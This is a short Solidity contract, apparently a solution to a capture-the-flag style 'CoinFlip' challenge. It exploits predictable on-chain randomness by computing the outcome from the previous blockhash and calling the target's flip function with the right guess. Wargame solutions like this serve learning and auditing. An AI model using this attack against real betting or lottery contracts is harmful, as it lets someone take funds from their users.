// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.6.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "./CoinFlip.sol";

contract CoinFlipAttacker {
    using SafeMath for uint256;

    CoinFlip coinflip;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {}

    function attack(address coinflipaddr) public returns (bool) {
        coinflip = CoinFlip(coinflipaddr);

        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        return coinflip.flip(side);
    }
}
